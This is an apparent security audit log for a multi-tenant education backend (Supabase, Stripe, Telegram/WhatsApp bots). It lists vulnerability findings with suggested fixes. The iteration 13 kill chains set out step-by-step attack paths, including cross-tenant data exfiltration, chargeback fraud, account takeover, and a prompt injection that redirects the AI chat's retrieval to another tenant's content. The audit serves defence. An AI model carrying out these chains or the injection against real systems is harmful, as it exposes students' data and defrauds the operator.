| 1 | MEDIUM | `mv_student_knowledge_profile` (materialized view) | `20260305000001:24` | MV aggregates every student's BKT mastery + FSRS difficulty across ALL institutions. No explicit `GRANT`/`REVOKE`. **MVs don't support RLS**; if Supabase `ALTER DEFAULT PRIVILEGES` in `public` covers matviews (PG14+), default grants could leave it PostgREST-readable. Not verifiable from migrations alone. | `REVOKE ALL ON mv_student_knowledge_profile FROM anon, authenticated; GRANT SELECT ... TO service_role` as defense-in-depth. |
| 2 | MEDIUM | `algorithm_config` | `20260304000001:63-66` | `FOR SELECT USING (true) TO authenticated` — **any authenticated user can read every institution's BKT priors and NeedScore weights** (proprietary algorithm config). Writes correctly scoped. Competitive/pedagogical tuning leaks cross-tenant. | Change SELECT policy: `USING (institution_id IS NULL OR institution_id = ANY(public.user_institution_ids()))` — global defaults + own inst. |
| 3 | MEDIUM | Gap window tables — RLS added AFTER creation | multiple | Tables created without `ENABLE ROW LEVEL SECURITY`; RLS added later. Supabase default grants leave them readable via PostgREST until RLS enabled. Windows: `processed_webhook_events` 21d, `ai_content_reports` 11d, `student_xp`/`xp_transactions` 7d, `whatsapp_sessions`/`telegram_sessions` 3-5d. Cosmetic if no data queried in window. | Convention: every `CREATE TABLE` migration MUST include `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` in same migration, enforced via CI lint. |

### Schema-wide verified clean
- 60+ tables audited: all multi-tenant data has RLS enabled with institution-scoped policies. Comprehensive list in subagent output.
- No `CREATE PUBLICATION` / `ALTER PUBLICATION supabase_realtime` in any migration — Realtime exfil via WebSocket not configured through migrations.
- No `CREATE SEQUENCE` / `GRANT ... ON SEQUENCE` — no explicit sequence exposure.
- No explicit `GRANT SELECT ON TABLE ... TO anon/authenticated` in any migration — everything rides on RLS.

### Schema-wide notes
- **Foreign-key error side-channel**: not scannable from migrations; Supabase+PostgREST FK violation messages can leak "id X exists" across tenants. Recommend separate Edge-Function-level audit.
- **PostgREST schema introspection**: `swagger_root` / `OPTIONS` endpoints expose schema metadata to anon by default. Requires Supabase config-level mitigation (not migration finding).
- Historical finding: `ai_reading_config` had `WITH CHECK (true)` 2026-03-03→2026-04-02 (30d window where any authenticated user could overwrite any inst's AI reading config). Already fixed in `20260402000001`. Not counted.
- `leaderboard_weekly` matview referenced by cron but NOT defined in any migration — cron runs no-op due to `IF EXISTS` guard.

### Iter 16 totals
- **2 CRITICAL** (flashcard-images + infographic-images public buckets with deterministic paths)
- **2 HIGH** (axon-images + axon-models-3d Math.random() entropy + public)
- **3 MEDIUM** (MV RLS gap, algorithm_config cross-tenant read, gap-window convention)

**Acumulado tras iter 16: 2 CRITICAL + 29 HIGH + 63 MED + 9 LOW = 103 findings**

---

## Iteration 15 — 2026-04-17 — SECURITY DEFINER RPC sweep (focused)

**Status:** ✓ complete

**Trigger**: iter 14 found `get_heavy_studiers_today` (granted to `authenticated`, returns cross-tenant data) — missed by iter 1 #198 batch. This sweep verifies whether other RPCs share the same gap.

### Sweep findings

| # | Severity | RPC | Migration:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **HIGH** | `search_keywords_by_institution(uuid,text,uuid,uuid,int)` | `20260306000004_search_kw_published_filter.sql:20` (body); grants `20260305000007:74` + `20260306000004:72` | **Granted to `anon, authenticated`** (worse than iter 14 #1: anon also has EXECUTE; never revoked). Returns `keywords.id, name, definition, summary_id, summary_title` for **any institution_id supplied by caller**; only filter is `s.institution_id = p_institution_id`; no internal `auth.uid()` membership check. **Anyone (including unauth via anon REST API call)** can pass any institution UUID and exfil all published keyword names + definitions of that tenant. The "SAFE — scoped read" comment in `20260402000001` is the same misclassification iter 1 #198 made on the maraton RPC. | (a) Add internal check: `IF NOT EXISTS (SELECT 1 FROM memberships WHERE user_id=auth.uid() AND institution_id=p_institution_id AND is_active) THEN RETURN; END IF;` (b) **REVOKE EXECUTE … FROM anon, authenticated** — preferred since callers (`keyword-search.ts`) already validate institution access via Edge Function admin client. |
| 2 | MEDIUM | `process_review_batch(uuid,jsonb,jsonb,jsonb)` | `20260414000001_review_batch_rpc.sql:30` (grant 180) | SECURITY DEFINER bypasses RLS; granted to `authenticated`. Reviews inserted under caller-supplied `p_session_id` with **no ownership check**. FSRS upsert and BKT upsert pull `student_id` directly from JSONB payload. Authenticated user can write FSRS/BKT rows for any other `student_id` (write-IDOR / data tampering). | Add `IF NOT EXISTS (SELECT 1 FROM study_sessions WHERE id=p_session_id AND student_id=auth.uid()) THEN RAISE EXCEPTION 'unauthorized'; END IF;` and validate every `(elem->>'student_id')::uuid = auth.uid()`. |
| 3 | MEDIUM | `increment_block_mastery_attempts(uuid,uuid,int,int)` | `20260406000001_block_mastery_states.sql:49` (grant 74) | SECURITY DEFINER, granted to `authenticated`. Takes caller-supplied `p_student_id` and updates `block_mastery_states` for that student. No `auth.uid()` check. Bypasses `block_mastery_own_update` RLS policy because SECURITY DEFINER ignores RLS. Auth user can tamper with another student's mastery counters. | Add `IF p_student_id != auth.uid() THEN RAISE EXCEPTION 'unauthorized'; END IF;` OR REVOKE from `authenticated` (matches `increment_bkt_attempts` pattern in `20260403000001`). |
| 4 | MEDIUM | `upsert_video_view(uuid,uuid,uuid,int,int,numeric,boolean,int)` | `20260227000003:24`, grant 77 | Original grant `anon, authenticated`. `20260402_01_security_revoke_rpc_rls_ai_reading_config.sql:17` only revoked from `authenticated`; **`anon` grant remains**. SECURITY DEFINER + caller-supplied `p_user_id` allows anyone (incl. unauth) to upsert `video_views` rows for any user_id (write-IDOR + view-count inflation). | `REVOKE EXECUTE … FROM anon`. Verify via `has_function_privilege('anon', 'upsert_video_view(uuid,uuid,uuid,int,int,numeric,boolean,int)', 'EXECUTE')`. |

### Sweep verified safe (cross-checked end-to-end)
- `search_scoped` — internal `auth.uid()` check + memberships join.
- `trash_scoped` — same `auth.uid()` + memberships pattern.
- `bulk_reorder` — service_role only.
- `get_student_timeliness_profile` + `get_projected_daily_workload` — both raise `unauthorized` when `p_student_id != auth.uid()`.
- All iter 1 #198 list RPCs re-confirmed REVOKEd from authenticated.
- `rag_hybrid_search`, `rag_coarse_to_fine_search` — REVOKEd via OID.
- `increment_student_stat`, `decrement_streak_freezes`, `increment_bkt_attempts` — service_role only.

### Sweep notes
- **`search_keywords_by_institution` adds an UNAUTH cross-tenant exfil path** — attacker doesn't need signup, just hits Supabase REST `/rpc/...` with anon key (public) + arbitrary institution UUID. **Promotes to a new chain — see iter 13 kill-chain v2 update needed**.
- iter 1 #198 used a "comment-says-safe" heuristic rather than reading body — recommend re-audit of any RPC the prompt's SAFE list inherited by name only.
- `process_review_batch` added 2026-04-14, after all prior REVOKE batches — likely never SEC-reviewed.
- Trigger functions excluded (not callable via PostgREST regardless of grant).

### Iter 15 totals
- **1 HIGH** (`search_keywords_by_institution` UNAUTH cross-tenant exfil)
- **3 MEDIUM** (write-IDOR x3: process_review_batch, increment_block_mastery_attempts, upsert_video_view)

**Acumulado tras iter 15: 27 HIGH + 60 MED + 9 LOW = 96 findings**

---

## Iteration 14 — 2026-04-17 — CDN/HTTP-smuggling + cron/admin-debug

**Status:** ✓ complete (CDN + cron/admin)

### Cron + admin debug + breakglass (security-scanner)

| # | Severity | Endpoint/cron | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **HIGH** | RPC `get_heavy_studiers_today(date,int)` (called by `check-maraton-badge` cron) | `migrations/20260402000006_maraton_cron.sql:13-49` | `SECURITY DEFINER STABLE`, no `auth.uid()` filter, returns `(student_id, institution_id, total_seconds)` for **ALL institutions**. Revoked from PUBLIC but **`GRANT EXECUTE ... TO authenticated`** — any auth user can `db.rpc('get_heavy_studiers_today')` and enumerate study time per student across every tenant. Cross-tenant data leak. **Same class as iter 1 #198 RPC sweep — that audit MISSED this RPC.** | `REVOKE EXECUTE ... FROM authenticated`; keep grant only to service_role (cron runs as postgres). Or add `WHERE EXISTS (...membership of caller in c.institution_id)` guard. |
| 2 | MEDIUM | `POST /ai/chat` writes `RL-DEBUG-2/3` payload to `rag_query_log.model_used` | `routes/ai/chat.ts:155-158, 382, 521, 583` | Persistently appends `body` keys + raw client-supplied summary_id/topic_id values + per-summary fallback trace to every chat row. Not env-gated; comment says "Remove once root cause is verified." Info disclosure + pollutes prod data column. | Wrap in `if (Deno.env.get("RL_DEBUG") === "true")` or remove. |
| 3 | LOW-MED | `wa-job-processor` & `tg-job-processor` cron jobs | `migrations/20260315000001_whatsapp_job_processor_cron.sql:42-55`, `20260319000014_bot_optimizations.sql:41-52` | Pure fire-and-forget HTTP POST via `pg_net` with no error/status capture. If `service_role_key` rotates or Edge URL changes, jobs go silently stale. Telegram cron uses `current_setting('app.settings.*')` (GUC) while WhatsApp uses `vault.decrypted_secrets` — inconsistent secret storage. | Capture `net.http_post` request_id into `cron.job_run_details` audit table; standardize on `vault.decrypted_secrets`. |

### Cron/admin verified clean
- `POST /whatsapp/process-queue`, `POST /telegram/process-queue` — service_role token + `timingSafeEqual` ✓
- `routes/admin/finals-periods.ts` — GET=`ALL_ROLES`, POST/PATCH/DELETE=`CONTENT_WRITE_ROLES` with cross-institution lookup ✓
- `routes/members/admin-scopes.ts` — owner-only, resolves institution via membership ✓
- `routes/settings/messaging-admin.ts` — owner/admin gated; `maskToken()` strips secrets in GET ✓
- `routes/ai/re-chunk.ts` — `CONTENT_WRITE_ROLES` + cross-institution check ✓
- `GET /health` — exposes only booleans for API key presence (standard) ✓
- 12 cron jobs total: `refresh-mv-knowledge-profile`, `wa-job-processor`, `wa-job-retention`, `wa-session-cleanup`, `wa-log-retention`, `tg-job-processor`, `tg-session-cleanup`, `tg-log-retention`, `reset-daily-xp`, `reset-weekly-xp`, `refresh-leaderboard`, `check-maraton-badge` — all idempotent SQL, no auth.uid() reliance.
- No Vercel cron config (`vercel.json`/`vercel/cron.json`) — Supabase pg_cron is sole scheduler.
- No `routes-dev.ts`/`routes-test.ts`/`routes-debug.ts`.
- No "force unlock"/"reset state"/"rebuild index"/breakglass routes (`re-embed-all.ts` is deleted stub).

### Cron/admin notes
- Finding #1 same class as iter-1 #198 batch — that audit missed this RPC. **Recommend codebase grep for any RPC defined in 2026-04 migrations missing a matching `REVOKE ... FROM authenticated` line.**
- `RL-DEBUG` payload (#2) is pre-existing, not iter-introduced; cleanup task.

### CDN cache + HTTP smuggling (security-scanner)

| # | Severity | Layer | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | Backend CORS (A05) | `server/index.ts:59` | `VERCEL_PREVIEW_RE = /^https:\/\/(numero1-sseki-2325-55\|axon-frontend)-[a-z0-9-]+\.vercel\.app$/` matches **any** project whose name starts with allowed prefix. Vercel project names team-scoped, not global. Attacker-owned project `axon-frontend-evil` deployed under any team yields `axon-frontend-evil-<hash>-<team>.vercel.app` satisfying regex. Limited blast radius (no `credentials:true`). | Anchor separator: `^https:\/\/(numero1-sseki-2325-55\|axon-frontend)-[a-f0-9]{9,}-[a-z0-9-]+\.vercel\.app$`, OR replace previews with exact allow-list. |
| 2 | MEDIUM | Backend rate-limit / IP trust (A04) | `server/rate-limit.ts:170-173` + `routes-auth.ts:61-63` | Per-IP key = `x-forwarded-for.split(",")[0].trim()`. Cloudflare/Vercel append real client IP to any client-supplied XFF — **first value is attacker-controlled**. Bypasses signup limit (5/h/IP) and unauth global rate-limit (300/min). | Prefer `cf-connecting-ip` (Cloudflare sets, strips inbound); otherwise take **last** XFF value (closest trusted hop). Document trusted-proxy assumption. |

### CDN/smuggling verified clean
- HTTP request smuggling: no manual `Content-Length` / `Transfer-Encoding` parsing. `Deno.serve` + Hono use spec-compliant `Request` body. No CL+TE confusion.
- Response splitting: only fixed strings reach `c.header(...)`; no user input interpolated into header values.
- Open redirect: `vercel.json` has only SPA rewrite, no `redirects:` block, no user-controlled `Location`. Backend has 0 `c.redirect(...)` calls.
- Web cache deception: long-cache scoped to `/assets/(.*)`; dynamic API on separate Supabase Functions domain.
- `s-maxage` cache-key collision: no `s-maxage`/`Vary` directives. SPA `index.ts` per-request from origin.
- CSP nonce predictability: CSP is static `script-src 'self'`; no `nonce-${random}` pattern.
- `X-Forwarded-Proto` / `X-Vercel-*`: not read or trusted by Hono routes.
- WebSocket smuggling: no backend `Upgrade` handling; realtime connects directly to OpenAI from frontend.
- Body-size DoS: explicit caps everywhere (uploads `MAX_FILE_SIZE`, PDFs `MAX_PDF_SIZE_BYTES`, pagination 500). JSON bodies bounded by Deno.serve / Supabase platform limit (~10 MB).

### Iter 14 totals
- **1 HIGH** (`get_heavy_studiers_today` RPC granted to authenticated → cross-tenant)
- **4 MEDIUM** (RL-DEBUG payload, CDN CORS regex, IP spoofing via XFF, cron monitoring gap)

**Acumulado tras iter 14: 26 HIGH + 57 MED + 9 LOW = 92 findings**

---

## Iteration 13 — 2026-04-17 — Kill-chain analysis v2 (post iter 11+12)

**Status:** ✓ complete

### What changed since v1
Iter 11 + 12 added **12 HIGH findings** that **collapse a prerequisite, open a new revenue-loss chain, and triple-stack the RAG attack surface**. Single biggest delta: `email_confirm: true` (iter 11 #1) drops Chain 1's prereq from "signed-up user" to **"anyone who can type an email-shaped string"** — fully scriptable mass tenancy access, no inbox needed. Iter 12 Stripe gaps (#2, #3, #5) introduce a NEW refund-keep-access chain that bypasses iter 1 RLS HIGH-1 path entirely (so fixing RLS no longer closes all billing abuse). Iter 12 sweep #1–#4 confirm the "first-active-membership" anti-pattern is **class-level (7 sites total) and bypasses RLS via admin client in 3 of them**. MFA absence (iter 11 #2) means Chain 6 has no second-factor backstop.

### Updated chains (v2)

#### Chain 1 (UPDATED) — Anonymous mass cross-tenant content exfil — **CRITICAL+**
**Prereq**: any well-formed-but-unowned email string (no inbox required)
1. [iter 11 #1] `email_confirm: true` — every signup pre-verified, no email proof needed.
2. [iter 3 auth HIGH-2] Auto-join → student in oldest active institution.
3. [iter 9 MED-3] `POST /ai/chat` no `institution_id` → first-membership fallback binds session.
4. [iter 3 AI HIGH-1] Prompt-injection sets `summaryId` → admin-client RAG fallback returns any tenant's `content_markdown`.
5. [iter 11 timing #1] `similarity` scores returned probe corpus contents even on chunks not directly fetched.
**Impact**: scriptable mass exfil; attacker doesn't need an email account.

#### Chain 2 (UPDATED) — Free plan upgrade via direct RLS write — **HIGH**
Prereq trivially obtained via Chain 1 step 1+2; otherwise unchanged. Sibling Chain 8 below means fixing iter 1 RLS HIGH-1 alone no longer closes all billing abuse.

#### Chain 3 (UPDATED) — TG account takeover → silent multi-tenant impersonation — **HIGH+**
1. [iter 11 #1 + iter 3 auth HIGH-2] Authenticated user.
2. [iter 8 MED-2] Linking-session collision flushes victim row.
3. [iter 11 timing #2] 6-digit code timing oracle accelerates brute force from ~17 min to seconds.
4. [iter 3 auth HIGH-1] No `chat_id` binding → attacker chat linked to victim user_id.
5. [iter 12 sweep #3 + #4] TG `get_keywords` / `get_summary` use admin client + first-membership → **silent cross-institution view**; victim sees no indicator.
6. [iter 3 auth MED-4] `tools-base` `student_id`-only filter aggregates results across all victim's institutions.

#### Chain 4 (UNCHANGED) — Fork PR → OPENAI_API_KEY exfil — **CRITICAL**

#### Chain 5 (UNCHANGED) — Malicious PDF → client compromise + RAG poisoning — **HIGH**

#### Chain 6 (UPDATED) — Multi-inst admin → SSRF → WhatsApp token theft — **HIGH+**
**Prereq amplified by [iter 11 #2 — no MFA]**: owner password compromise = single-factor pivot, no aal2 backstop.

#### Chain 7 (UNCHANGED) — Wallet/resource DoS — **MEDIUM**

#### Chain 8 (NEW) — Refund-keep-access → free premium AI consumption — **HIGH**
**Prereq**: payment method (chargeback-capable)
1. [iter 11 #1 + iter 3 auth HIGH-2] Authenticated student.
2. [iter 12 Stripe #5] Initiate checkout (no active-sub guard); pay.
3. Consume AI quota / exfil RAG during active window (compose with Chain 1).
4. [iter 12 Stripe #2] File chargeback / dispute via Stripe — **NO `charge.refunded` / `charge.dispute.created` handler**; subscription stays `active`/`trialing`.
5. [iter 12 Stripe #3] If Stripe deletes customer for fraud → `customer.deleted` not handled → entitlement persists indefinitely.
**Impact**: free indefinite premium access + AI-quota burn. Repeatable per fresh card.

#### Chain 9 (NEW) — Cross-tenant RAG triple-stack — **HIGH**
1. [iter 12 sweep #1] `lib/rag-search.ts` admin client + first-membership → cross-tenant RAG, no RLS backstop.
2. [iter 11 timing #1] Similarity scores leak corpus structure across tenant.
3. [iter 3 AI HIGH-1] Empty-RAG fallback escapes institution filter.
**Impact**: three independent cross-tenant RAG bugs; fixing any one leaves two. Class fix needed.

#### Chain 10 (NEW) — Past_due UI/state desync exploitation — **MEDIUM**
1. [iter 12 Stripe #1] `subscription.updated` writes Stripe statuses verbatim.
2. [iter 12 Stripe #4] `past_due` revoked instantly by `access.ts` but `subscription-status` reports `is_active=true` → user sees "subscribed" but AI calls 403.
3. Support burden + churn + refund disputes funnel into Chain 8.

### Updated Pareto fix order (v2)

| # | Finding | Chains broken | Effort |
|---|---|---|---|
| 1 | **iter 11 #1** (`email_confirm: false`) | Gates 1, 2, 3, 7, 8, 9 — collapses prereq | trivial (one flag) |
| 2 | **iter 3 auth HIGH-2** (remove auto-join) | 1, 2, 3, 7, 8, 9 | trivial (env flag/invite) |
| 3 | **First-membership class fix** (iter 1 HIGH-1 + iter 9 MED-2/3 + iter 12 sweep #1-#4) | 1, 3, 6, 9 + silent-TG chain | **medium (7 sites, lint rule)** |
| 4 | **iter 3 AI HIGH-1** (`.eq institution_id` on RAG fallback) | 1, 9 (defense-in-depth) | small (one line) |
| 5 | **iter 12 Stripe #2 + #3** (refund/dispute/customer.deleted handlers) | 8 entirely | small (3 handlers) |
| 6 | **iter 1 RLS HIGH-1** (drop members billing writes) | 2 at DB layer | small |
| 7 | **iter 4 CI HIGH-1** (PR job same-repo gate) | 4 entirely | trivial |

**Honorable mentions**: iter 11 #2 (MFA on owner/admin) hardens Chain 6; iter 5 HIGH-2/3 close Chain 5; iter 3 auth HIGH-1 closes Chain 3 at link primitive.

### Updated force multipliers (v2)

- **First-active-membership anti-pattern (class)** — chains **1, 3, 6, 9, silent-TG** (5+). **NOW DOMINANT class multiplier**.
- **iter 3 auth HIGH-2 (signup auto-join)** — chains **1, 2, 3, 7, 8, 9** (6). Still single dominant finding.
- **iter 11 #1 (email_confirm: true)** — overlays on **same 6 chains** as auto-join. Both need fixing; fixing one alone still leaves mass-scale access.
- **iter 3 AI HIGH-1 (RAG fallback institution bypass)** — chains **1, 9** + amplifier on 5.
- **iter 11 #2 (no MFA)** — chain **6** + amplifier on any future admin-credential compromise.

---

## Iteration 12 — 2026-04-17 — Stripe billing edge cases + first-membership sweep

**Status:** ✓ complete (Stripe + first-membership sweep)

### Stripe billing edge cases (security-scanner)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | **HIGH** | `webhook.ts:114-131` (`customer.subscription.updated`) | Status written verbatim from `sub.status` with no whitelist. Stripe states `incomplete`/`incomplete_expired`/`unpaid`/`paused` persisted, but `is_active`/`checkPlanLimit` only allow `["active","trialing"]`. Subscriber whose card fails initial confirmation or who Stripe pauses **silently loses access with no UI/state for the app to react**; `subscription-status` (index.ts:128) treats `past_due` as `is_active=true` (line 173 excludes it) → **inconsistent across endpoints**. | Whitelist Stripe statuses, normalize unknowns to `unknown`, log+alert; align "active" definition across `access.ts` / `index.ts:128` / `index.ts:173`. |
| 2 | **HIGH** | `webhook.ts` (no handler) — `charge.refunded`, `charge.dispute.created`, `charge.dispute.funds_withdrawn` | **Refund/dispute events DROPPED into `default:` warn branch.** Subscription stays `active`/`trialing`; customer keeps premium access after Stripe refund or chargeback. Combined with #7 below: subscribe → consume AI quota → dispute → keep access. | Add handlers: on `charge.refunded` (full refund) or `charge.dispute.created` demote linked subscription to `revoked` immediately; freeze checkout for the customer. |
| 3 | **HIGH** | `webhook.ts` (no handler) — `customer.deleted` | Not handled. If Stripe deletes a customer for fraud (or admin deletes manually), `institution_subscriptions.stripe_customer_id` becomes a dangling FK; `portal-session` returns Stripe 404 leaking the dead id, and `checkPlanLimit` continues to grant entitlements. | Add handler that finds rows by `stripe_customer_id` and sets `status='canceled', canceled_at=now()`. |
| 4 | **HIGH** | `webhook.ts:148-162` (`invoice.payment_failed`) + `access.ts:46,103` | Marks `past_due`. `checkPlanLimit` and `content-access` instantly drop the user — **NO grace period** (Stripe's smart-retry runs ~3 weeks). Inverse concern: hard-revoke is harsh AND `subscription-status` (index.ts:128) still treats `past_due` as `is_active=true` → UI tells user they're subscribed while AI calls denied. | Define explicit grace window (e.g. `current_period_end + 7d`) and apply consistently in BOTH places. |
| 5 | **HIGH** | `billing/index.ts:29-76` (`/billing/checkout-session`) | NO guard against initiating second checkout while `active`/`trialing` subscription exists for `(user_id, institution_id)`. `checkout.session.completed` then unconditionally `INSERT`s → duplicate rows; downstream readers take "first by created_at desc", **older paid sub is shadowed and orphaned (still billed by Stripe, ignored by app)**. | Pre-check `institution_subscriptions` for active row → reject 409 or route to plan-change flow; in webhook, switch to UPSERT keyed on `stripe_subscription_id`. |
| 6 | MEDIUM | `webhook.ts:86-94` + `index.ts:50-55` | `user_id` is initiating user. No code revokes subscription row when that user's membership is removed → institution loses subscriber while billing continues. `subscription-status` filters by `user_id` so admin can't see/cancel it. | On membership soft-delete, reassign `institution_subscriptions.user_id` to institution owner OR cancel Stripe sub. |
| 7 | MEDIUM | `billing/index.ts:69` (trial) + `webhook.ts:86` | Trial reuse: only check is existing-customer lookup. User who cancels and re-subscribes gets fresh row with `trial_period_days` again; with different email, no dedupe at all. Multiple trials per institution achievable. | Pass `subscription_data[trial_period_days]` only if no prior subscription exists; track trial-consumed flag per institution. |
| 8 | MEDIUM | `webhook.ts:65-112` + `billing/index.ts` entire | NO `currency`/`amount_total` validation against `institution_plans.price_cents`/`currency`. Stripe honors whatever currency the price object has; if mis-configured or replaced in dashboard, app silently grants entitlement at any price (including 0). | After checkout completion, fetch session/line_items, assert `amount_total` and `currency` match `institution_plans` before INSERT. |
| 9 | MEDIUM | `access.ts:109-112` | `content-access` performs WRITE (`UPDATE status='expired'`) inside a GET handler with user's own JWT client, not admin. Two concurrent GETs after `current_period_end` race; also `expired` is not Stripe-recognized → next webhook UPDATE overwrites. State machine app-side collides with Stripe-side. | Move expiry sweep to scheduled job using admin client; don't derive states webhook also writes. |

### Stripe verified clean
- Webhook signature verification (timing-safe, 5-min tolerance) — webhook.ts:195-236.
- Idempotency SELECT-then-INSERT race already tracked (iter 6 HIGH-1).
- Webhook payload type guard (iter 5/250) already fixed in PR #250.
- NO user-controlled `coupon`/`promotion_code`/`discounts` forwarded to checkout — only price+qty+metadata+trial days. Coupon-abuse vector closed.
- `customer.subscription.deleted` correctly sets `canceled` + `canceled_at`.
- Stripe client uses 15s timeout + AbortController. No hung connections.

### Stripe notes
- Test-vs-live key mixing: only one `STRIPE_WEBHOOK_SECRET` env var read; test events cannot affect prod unless operator deploys test secret. Ops concern.
- Proration: app never reads `invoice.payment_succeeded` to confirm proration paid; downgrade with failed proration invoice still flips `plan_id` in DB. Future hardening.
- `default:` branch silently `console.warn`s unknown events but still writes to `processed_webhook_events` → re-delivery deduped, never replayed even if handler added later. Consider gating dedup write to "had a real handler".

### First-active-membership codebase sweep (security-scanner)

**Anti-pattern is more widespread than known**: 4 NEW HIGH sites in addition to 3 already-known. Total = 7 sites with same root cause.

| # | Severity | File:line | Variant | Issue | Fix |
|---|---|---|---|---|---|
| 1 | **HIGH** | `lib/rag-search.ts:59-66` | `.limit(1).single()` | Fallback when no `summaryId` picks arbitrary membership; binds RAG search to wrong tenant for multi-inst students. **Service uses `getAdminClient()` → bypasses RLS = true cross-tenant exposure**. | Require explicit `institution_id` arg, OR refuse to run RAG without `summaryId`. |
| 2 | **HIGH** | `routes/content/keyword-search.ts:74-86` | `.limit(1).single()` then `requireInstitutionRole` | Picks first membership, then "verifies" role in the institution the route just chose itself — **role check is no-op for cross-tenant binding**. Search results scoped to arbitrary inst. | Accept `institution_id` query param; resolve via the keyword/topic browsed; or reject when caller has >1 active membership. |
| 3 | **HIGH** | `routes/telegram/tools.ts:414-421` (`get_keywords`) | `.limit(1).single()` | TG-linked user with multi-inst memberships gets keyword listings/search bound to one arbitrary inst. **Admin client; no RLS safety net**. User can't see which tenant the bot picked → silent cross-tenant view. | Resolve institution from linked TG chat (already known) or persist chosen `institution_id` in session. |
| 4 | **HIGH** | `routes/telegram/tools.ts:487-494` (`get_summary`) | `.limit(1).single()` | Same as above for summary lookup. `eq("topics.sections.courses.institution_id", ...)` filter only fires if chosen membership matches → student silently denied access to summaries in their other institutions, OR shown tenant-bound view hiding legit content. | Same as #3. |
| 5 | MEDIUM | `routes/settings/messaging-admin.ts:39-50` (helper `getUserInstitution`) | helper amplifier | Helper is iter-1 #1 but is the in-process resolver used by 3 routes (lines 98, 144, 235). One bug, 3-route blast radius. | Rewrite helper to require `institution_id` arg from caller. |
| 6 | LOW | `routes-auth.ts:137-151` | `.order("created_at", asc).limit(1).single()` on `institutions` | New-signup auto-join attaches every new user to OLDEST active institution. Deterministic but global: every signup lands in tenant #1. Already iter 3 HIGH-2; this re-confirms. | Replace auto-join with explicit invite/JOIN-via-code flow. |

### Sweep verified clean (called out as SAFE patterns)
- `auth-helpers.ts::resolveCallerRole` — filters by caller-supplied `institution_id`.
- `auth-helpers.ts::resolveMembershipInstitution` — lookup by membership UUID.
- `routes/content/{prof-notes,keyword-connections,keyword-connections-batch,flashcard-mappings}.ts::resolveInstitution*` — SAFE wrappers around `resolve_parent_institution`; every caller chains `requireInstitutionRole`.
- `crud-factory.ts::resolveInstitutionFromParent` — resolves from row's parent.
- `routes/members/{memberships,institutions}.ts` — explicit `id`/`institution_id` or aggregates ALL.
- `routes/study-queue/resolvers.ts` — iterates over ALL memberships.
- `routes/_messaging/tools-base.ts:280-285`, `routes/whatsapp/handler.ts:280-298`, `routes/telegram/handler.ts:210-228` — aggregate via `.in(institution_id, instIds)`.
- `routes/billing/webhook.ts:102` — webhook context, explicit `institutionId` from Stripe metadata (UUID-validated).
- All `resolve_parent_institution` callers across `routes/ai/*`, `routes/mux/*`, `routes/content/*`, `routes-models.ts`, `xp-hooks.ts` — every one immediately calls `requireInstitutionRole` with resolved `instId`.

### Sweep notes
- Findings #1-#4 use `getAdminClient()` / un-scoped `db` → RLS NOT a backstop. Severity HIGH.
- Findings #3-#4 (TG tools) particularly nasty — admin client + user can't see which tenant bot picked = silent cross-tenant view.
- No JWT-claim institution reads found (`app_metadata.institution`, etc.). All routes resolve server-side.
- No `memberships[0]` array-index pattern.

### Iter 12 totals
- **9 HIGH** (5 Stripe + 4 first-membership new sites)
- **5 MEDIUM** (4 Stripe + 1 sweep helper amplifier)
- **0 LOW**

**Acumulado tras iter 12: 25 HIGH + 53 MED + 9 LOW = 87 findings**

---

## Iteration 11 — 2026-04-17 — Timing/side-channel + migration/Auth

**Status:** ✓ complete (timing + migration/Auth)

### Timing / side-channel (security-scanner)

| # | Severity | File:line | Issue | Fix |
|---|---|---|---|---|
| 1 | HIGH | `routes/ai/chat/context-assembly.ts:52,58` (+ emission `chat.ts:480-481, 601`) | RAG `sourcesUsed` returned to client with `similarity` scores per chunk (rounded to 2 decimals). **Vector-similarity oracle**: caller controlling the query can probe which chunks exist in institution's corpus and approximate their embeddings, leaking content from chunks they cannot read directly. Compounds with iter-3 HIGH-1 (empty-RAG fallback): user can also infer institution scoping. | Strip `similarity` from `sourcesUsed` returned to clients (keep server-side for logging only). Return only `chunk_id` + `summary_title`. |
| 2 | MEDIUM | `routes/telegram/link.ts:113` | 6-digit linking-code compared with `===` inside `sessions.find()`. `find()` short-circuits on first match → attacker observing response latency probes which of up to 200 sessions matched. Combined with constrained 6-digit space (1M values, ~5min validity), real oracle. | Iterate ALL sessions (no early-exit) + `timingSafeEqual(ctx.linking_code, code)`. Add per-chat attempt counter as brute-force cap. |
| 3 | MEDIUM | `routes/whatsapp/link.ts:107` | Identical pattern: `ctx.linking_code === code` inside `sessions.find()` over up to 200 sessions. Same oracle. | Same fix: full-iteration + `timingSafeEqual`. |
| 4 | MEDIUM | `routes/calendar/exam-events.ts:138-139, 197-198`; `routes/schedule/exam-prep.ts:46-47` | Resource-existence oracle: returns 404 when row doesn't exist, 403 when row exists but `student_id !== user.id`. Two-status discriminator → enumerate valid `exam_event` UUIDs across tenants. | Collapse to single 404 ("Exam event not found"). The crud-factory already does this correctly. |
| 5 | LOW | `routes/whatsapp/webhook.ts:240` | `token === expectedToken` for `WHATSAPP_VERIFY_TOKEN`. Static long-lived secret compared with non-constant-time `===`. Endpoint = Meta verification GET (one-time subscribe), low practical exploitability. | `timingSafeEqual(token, expectedToken)`. |

### Timing verified clean
- Stripe webhook: `timingSafeEqual` ✓
- Telegram webhook: `timingSafeEqual` ✓
- WhatsApp HMAC: `timingSafeEqual` ✓
- Mux webhook: `crypto.subtle.verify` (constant-time by spec) ✓
- Service-role token in admin routes: `timingSafeEqual` ✓
- JWT validation: delegated to `jose` lib (no manual claim string compares) ✓
- Password reset / verification-code flows: confirmed absent (no Supabase-managed flow in repo)
- CRUD-factory 404 vs 403: returns 404 for both "row missing" AND "row in different institution"; 403 only when caller IS in inst but lacks role (membership existence is info caller already has)
- Rate-limit 429 vs 401 differential: middleware runs before route resolution + applies uniformly — does NOT reveal route existence
- `Deno.env.get(...) === "true"`: public boolean feature flags, not secrets — not a timing oracle
- No `.includes`/`.startsWith` over secrets

### Timing notes
- **Signup email enumeration is INTENTIONAL** (UX): `routes-auth.ts:107` returns 409 + "Este email ya esta registrado". Not a timing oracle but explicit info disclosure. Worth raising to product if hardening enumeration resistance is desired.
- TG link code: `find()` over up to 200 rows + 6-digit code = brute-forceable in ~17min at 1 req/sec without rate limit.

### Migration history + Supabase Auth (security-scanner)

